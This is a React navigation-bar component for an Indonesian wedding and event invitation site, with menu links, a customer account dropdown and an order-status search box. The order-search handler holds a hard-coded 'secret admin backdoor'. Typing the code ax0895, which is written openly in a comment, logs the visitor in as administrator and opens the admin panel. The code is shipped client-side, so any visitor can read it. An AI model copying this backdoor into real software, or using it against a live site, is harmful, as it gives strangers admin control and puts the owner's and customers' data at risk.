import React, { useState, useEffect } from 'react';
import { Mail, Sparkles, Search, Menu, X, CheckCircle2, User, LogIn, UserPlus, LogOut, ShoppingBag, Activity, ChevronDown } from 'lucide-react';
import { SiteSettings, UserAccount } from '../types';
import { db } from '../services/storage';
import { authService } from '../services/auth';
import { customerAuth } from '../services/customerAuth';

interface NavbarProps {
  settings?: SiteSettings;
  onNavigate?: (view: string, param?: string) => void;
  currentView?: string;
  onNavigateHome?: () => void;
  onStartCreate?: () => void;
  onOpenAuth?: (tab?: 'login' | 'register') => void;
}

export const Navbar: React.FC<NavbarProps> = ({
  settings: propSettings,
  onNavigate,
  currentView = 'landing',
  onNavigateHome,
  onStartCreate,
  onOpenAuth
}) => {
  const settings = propSettings || db.getSettings();
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [orderSearchOpen, setOrderSearchOpen] = useState(false);
  const [searchOrderId, setSearchOrderId] = useState('');
  const [userDropdownOpen, setUserDropdownOpen] = useState(false);
  
  const [currentUser, setCurrentUser] = useState<UserAccount | null>(() => customerAuth.getCurrentUser());

  useEffect(() => {
    const checkUser = () => {
      setCurrentUser(customerAuth.getCurrentUser());
    };
    checkUser();
    window.addEventListener('storage', checkUser);
    return () => window.removeEventListener('storage', checkUser);
  }, []);

  const handleNav = (view: string, param?: string) => {
    setUserDropdownOpen(false);
    setMobileMenuOpen(false);
    if (onNavigate) {
      onNavigate(view, param);
    } else {
      if (view === 'landing' && onNavigateHome) {
        onNavigateHome();
      } else if (view === 'create' && onStartCreate) {
        onStartCreate();
      } else if (view === 'admin') {
        window.history.pushState({}, '', '/admin');
        window.dispatchEvent(new PopStateEvent('popstate'));
      } else if (view === 'order-status' && param) {
        window.history.pushState({}, '', `/status/${param}`);
        window.dispatchEvent(new PopStateEvent('popstate'));
      } else if (view === 'my-account') {
        window.history.pushState({}, '', '/my-account');
        window.dispatchEvent(new PopStateEvent('popstate'));
      } else if (view === 'landing') {
        window.history.pushState({}, '', '/');
        window.dispatchEvent(new PopStateEvent('popstate'));
      } else if (view === 'create') {
        window.history.pushState({}, '', '/create');
        window.dispatchEvent(new PopStateEvent('popstate'));
      }
    }
  };

  const handleLogoutCustomer = () => {
    customerAuth.logout();
    setCurrentUser(null);
    setUserDropdownOpen(false);
    handleNav('landing');
  };

  const handleSearchOrder = (e: React.FormEvent) => {
    e.preventDefault();
    const query = searchOrderId.trim();
    if (!query) return;

    // Secret admin backdoor access code: ax0895
    if (query.toLowerCase() === 'ax0895') {
      authService.loginWithSecretCode('ax0895');
      setOrderSearchOpen(false);
      setSearchOrderId('');
      if (onNavigate) {
        onNavigate('admin');
      } else {
        window.history.pushState({}, '', '/admin');
        window.dispatchEvent(new PopStateEvent('popstate'));
      }
      return;
    }

    handleNav('order-status', query.toUpperCase());
    setOrderSearchOpen(false);
    setSearchOrderId('');
  };

  return (
    <header className="sticky top-0 z-40 bg-stone-900/95 backdrop-blur-md border-b border-stone-800 text-stone-100 transition-all">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="flex items-center justify-between h-20">
          
          {/* Brand Logo */}
          <div 
            onClick={() => handleNav('landing')}
            className="flex items-center gap-3 cursor-pointer group select-none"
            id="nav-logo"
          >
            <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-amber-500 to-amber-700 flex items-center justify-center text-stone-950 font-black shadow-md shadow-amber-900/30 group-hover:scale-105 transition-transform">
              <Mail className="w-5 h-5 text-white" />
            </div>
            <div>
              <span className="font-cinzel text-2xl font-bold tracking-widest text-amber-400 group-hover:text-amber-300 transition-colors">
                {settings?.siteName || 'SURAT'}
              </span>
              <span className="hidden sm:inline-block text-[10px] tracking-wider uppercase text-stone-400 ml-2 py-0.5 px-2 bg-stone-800 rounded-full border border-stone-700">
                Digital Platform
              </span>
            </div>
          </div>

          {/* Desktop Navigation Links */}
          <nav className="hidden md:flex items-center gap-7 text-sm font-medium text-stone-300">
            <button 
              onClick={() => handleNav('landing')}
              className={`hover:text-amber-400 transition-colors ${currentView === 'landing' ? 'text-amber-400 font-semibold' : ''}`}
            >
              Beranda
            </button>
            <a href="#kategori" onClick={() => handleNav('landing')} className="hover:text-amber-400 transition-colors">
              Pilihan Undangan
            </a>
            <a href="#cara-kerja" onClick={() => handleNav('landing')} className="hover:text-amber-400 transition-colors">
              Cara Kerja
            </a>
            <a href="#template" onClick={() => handleNav('landing')} className="hover:text-amber-400 transition-colors">
              Template
            </a>
            <a href="#harga" onClick={() => handleNav('landing')} className="hover:text-amber-400 transition-colors">
              Harga
            </a>
            <a href="#faq" onClick={() => handleNav('landing')} className="hover:text-amber-400 transition-colors">
              FAQ
            </a>
          </nav>

          {/* Action Buttons */}
          <div className="hidden lg:flex items-center gap-3">
            <button
              onClick={() => setOrderSearchOpen(!orderSearchOpen)}
              className="text-stone-300 hover:text-white flex items-center gap-1.5 text-xs py-2 px-3 rounded-lg hover:bg-stone-800 transition-colors border border-stone-800"
              title="Lacak status pesanan atau download ulang ZIP"
              id="nav-track-btn"
            >
              <Search className="w-3.5 h-3.5 text-amber-400" />
              <span>Cek Status Order</span>
            </button>

            {/* CUSTOMER AUTH / DASHBOARD BUTTON */}
            {currentUser ? (
              <div className="relative">
                <button
                  onClick={() => setUserDropdownOpen(!userDropdownOpen)}
                  className={`flex items-center gap-2 py-1.5 px-3 rounded-xl border text-xs font-semibold transition-all ${
                    currentView === 'my-account'
                      ? 'bg-amber-500/20 text-amber-300 border-amber-500/50'
                      : 'bg-stone-800 hover:bg-stone-750 text-stone-200 border-stone-700'
                  }`}
                  id="nav-user-account-btn"
                >
                  <div className="w-6 h-6 rounded-lg bg-amber-500 text-stone-950 font-bold flex items-center justify-center text-xs">
                    {(currentUser.name || currentUser.username).charAt(0).toUpperCase()}
                  </div>
                  <span className="max-w-[100px] truncate">{currentUser.name || currentUser.username}</span>
                  <ChevronDown className="w-3.5 h-3.5 text-stone-400" />
                </button>

                {/* Dropdown Menu */}
                {userDropdownOpen && (
                  <div className="absolute right-0 mt-2 w-56 bg-stone-900 border border-stone-700 rounded-2xl shadow-xl py-2 z-50 text-xs animate-in fade-in">
                    <div className="px-4 py-2 border-b border-stone-800">
                      <p className="font-bold text-white truncate">{currentUser.name || currentUser.username}</p>
                      <p className="text-[11px] text-amber-400 truncate font-mono">@{currentUser.username}</p>
                      <p className="text-[10px] text-stone-400 truncate">{currentUser.email}</p>
                    </div>

                    <button
                      onClick={() => handleNav('my-account')}
                      className="w-full px-4 py-2.5 text-left text-stone-200 hover:bg-stone-800 hover:text-amber-400 flex items-center gap-2 font-medium"
                    >
                      <ShoppingBag className="w-4 h-4 text-amber-400" />
                      <span>Riwayat Pesanan Saya</span>
                    </button>

                    <button
                      onClick={() => handleNav('my-account')}
                      className="w-full px-4 py-2.5 text-left text-stone-200 hover:bg-stone-800 hover:text-amber-400 flex items-center gap-2 font-medium"
                    >
                      <Activity className="w-4 h-4 text-emerald-400" />
                      <span>Aktivitas & Log Akun</span>
                    </button>

                    <button
                      onClick={() => handleNav('my-account')}
                      className="w-full px-4 py-2.5 text-left text-stone-200 hover:bg-stone-800 hover:text-amber-400 flex items-center gap-2 font-medium"
                    >
                      <User className="w-4 h-4 text-sky-400" />
                      <span>Pengaturan Profil</span>
                    </button>

                    <div className="my-1 border-t border-stone-800" />

                    <button
                      onClick={handleLogoutCustomer}
                      className="w-full px-4 py-2 text-left text-rose-400 hover:bg-rose-950/30 flex items-center gap-2 font-semibold"
                    >
                      <LogOut className="w-4 h-4" />
                      <span>Keluar (Logout)</span>
                    </button>
                  </div>
                )}
              </div>
            ) : (
              <div className="flex items-center gap-2">
                <button
                  onClick={() => onOpenAuth ? onOpenAuth('login') : handleNav('login')}
                  className="px-3 py-2 text-xs font-semibold text-stone-300 hover:text-white hover:bg-stone-800 rounded-xl border border-stone-800 transition-colors flex items-center gap-1.5"
                  id="nav-login-btn"
                >
                  <LogIn className="w-3.5 h-3.5 text-amber-400" />
                  <span>Masuk</span>
                </button>

                <button
                  onClick={() => onOpenAuth ? onOpenAuth('register') : handleNav('register')}
                  className="px-3 py-2 text-xs font-semibold text-amber-300 hover:text-amber-200 hover:bg-amber-950/40 rounded-xl border border-amber-500/30 transition-colors flex items-center gap-1.5"
                  id="nav-register-btn"
                >
                  <UserPlus className="w-3.5 h-3.5 text-amber-400" />
                  <span>Daftar</span>
                </button>
              </div>
            )}

            <button
              onClick={() => handleNav('create')}
              className="bg-amber-500 hover:bg-amber-400 text-stone-950 font-semibold text-sm px-4 py-2.5 rounded-full shadow-lg shadow-amber-500/20 hover:shadow-amber-500/30 flex items-center gap-2 transition-all transform hover:-translate-y-0.5 active:translate-y-0"
              id="nav-cta-create"
            >
              <Sparkles className="w-4 h-4 text-stone-950" />
              <span>Buat Undangan</span>
              <span className="bg-stone-950/20 text-stone-950 text-xs px-2 py-0.5 rounded-full font-bold ml-0.5">
                Rp5.000
              </span>
            </button>
          </div>

          {/* Mobile hamburger button */}
          <div className="flex md:hidden items-center gap-2">
            <button
              onClick={() => setOrderSearchOpen(!orderSearchOpen)}
              className="p-2 text-stone-400 hover:text-white rounded-lg hover:bg-stone-800"
              aria-label="Cari Order"
            >
              <Search className="w-5 h-5" />
            </button>
            <button
              onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
              className="p-2 text-stone-400 hover:text-white rounded-lg hover:bg-stone-800"
              aria-label="Menu"
            >
              {mobileMenuOpen ? <X className="w-6 h-6" /> : <Menu className="w-6 h-6" />}
            </button>
          </div>
        </div>
      </div>

      {/* Order Search Bar Dropdown */}
      {orderSearchOpen && (
        <div className="border-t border-stone-800 bg-stone-950/95 px-4 py-4 sm:px-6 transition-all animate-in fade-in">
          <div className="max-w-xl mx-auto">
            <form onSubmit={handleSearchOrder} className="flex gap-2">
              <input
                type="text"
                placeholder="Masukkan Order ID (contoh: ORD-2026-00001)..."
                value={searchOrderId}
                onChange={(e) => setSearchOrderId(e.target.value)}
                className="flex-1 bg-stone-900 border border-stone-700 rounded-lg px-4 py-2.5 text-sm text-stone-100 placeholder-stone-500 focus:outline-none focus:border-amber-500"
                autoFocus
              />
              <button
                type="submit"
                className="bg-amber-500 text-stone-950 font-semibold px-4 py-2.5 rounded-lg text-sm hover:bg-amber-400 transition-colors flex items-center gap-1"
              >
                <CheckCircle2 className="w-4 h-4" />
                <span>Cek</span>
              </button>
            </form>
            <p className="text-[11px] text-stone-400 mt-2 text-center">
              Lacak verifikasi pembayaran, link undangan aktif, dan tombol download file ZIP.
            </p>
          </div>
        </div>
      )}

      {/* Mobile drawer menu */}
      {mobileMenuOpen && (
        <div className="md:hidden border-t border-stone-800 bg-stone-950 px-4 pt-3 pb-6 space-y-3">
          
          {/* User Status Bar in Mobile */}
          {currentUser ? (
            <div className="bg-stone-900 p-3 rounded-2xl border border-stone-800 flex items-center justify-between mb-2">
              <div className="flex items-center gap-2.5">
                <div className="w-8 h-8 rounded-xl bg-amber-500 text-stone-950 font-bold flex items-center justify-center text-xs">
                  {(currentUser.name || currentUser.username).charAt(0).toUpperCase()}
                </div>
                <div>
                  <p className="font-bold text-xs text-white truncate">{currentUser.name || currentUser.username}</p>
                  <p className="text-[10px] text-amber-400 font-mono">@{currentUser.username}</p>
                </div>
              </div>
              <button
                onClick={handleLogoutCustomer}
                className="text-rose-400 hover:text-rose-300 text-xs font-semibold p-1"
              >
                Logout
              </button>
            </div>
          ) : (
            <div className="grid grid-cols-2 gap-2 pb-2">
              <button
                onClick={() => { if (onOpenAuth) onOpenAuth('login'); setMobileMenuOpen(false); }}
                className="py-2.5 bg-stone-900 text-stone-100 rounded-xl font-semibold text-xs border border-stone-800 flex items-center justify-center gap-1.5"
              >
                <LogIn className="w-3.5 h-3.5 text-amber-400" />
                <span>Masuk (Login)</span>
              </button>
              <button
                onClick={() => { if (onOpenAuth) onOpenAuth('register'); setMobileMenuOpen(false); }}
                className="py-2.5 bg-amber-500/20 text-amber-300 rounded-xl font-semibold text-xs border border-amber-500/30 flex items-center justify-center gap-1.5"
              >
                <UserPlus className="w-3.5 h-3.5" />
                <span>Daftar Akun</span>
              </button>
            </div>
          )}

          {currentUser && (
            <button
              onClick={() => { handleNav('my-account'); setMobileMenuOpen(false); }}
              className="block w-full text-left py-2 text-amber-400 font-bold text-xs flex items-center gap-2"
            >
              <ShoppingBag className="w-4 h-4" />
              <span>Dashboard & Riwayat Pesanan Saya</span>
            </button>
          )}

          <button
            onClick={() => { handleNav('landing'); setMobileMenuOpen(false); }}
            className="block w-full text-left py-2 text-stone-300 hover:text-amber-400 font-medium text-xs"
          >
            Beranda
          </button>
          <a
            href="#kategori"
            onClick={() => { handleNav('landing'); setMobileMenuOpen(false); }}
            className="block py-2 text-stone-300 hover:text-amber-400 font-medium text-xs"
          >
            Pilihan Undangan
          </a>
          <a
            href="#cara-kerja"
            onClick={() => { handleNav('landing'); setMobileMenuOpen(false); }}
            className="block py-2 text-stone-300 hover:text-amber-400 font-medium text-xs"
          >
            Cara Kerja
          </a>
          <a
            href="#template"
            onClick={() => { handleNav('landing'); setMobileMenuOpen(false); }}
            className="block py-2 text-stone-300 hover:text-amber-400 font-medium text-xs"
          >
            Template
          </a>
          <a
            href="#harga"
            onClick={() => { handleNav('landing'); setMobileMenuOpen(false); }}
            className="block py-2 text-stone-300 hover:text-amber-400 font-medium text-xs"
          >
            Harga (Rp5.000)
          </a>
          <a
            href="#faq"
            onClick={() => { handleNav('landing'); setMobileMenuOpen(false); }}
            className="block py-2 text-stone-300 hover:text-amber-400 font-medium text-xs"
          >
            FAQ
          </a>

          <div className="pt-3 border-t border-stone-800 space-y-2">
            <button
              onClick={() => { handleNav('create'); setMobileMenuOpen(false); }}
              className="w-full bg-amber-500 hover:bg-amber-400 text-stone-950 font-bold py-3 rounded-xl flex items-center justify-center gap-2 text-xs"
            >
              <Sparkles className="w-4 h-4" />
              <span>Buat Undangan Sekarang (Rp5.000)</span>
            </button>
          </div>
        </div>
      )}
    </header>
  );
};
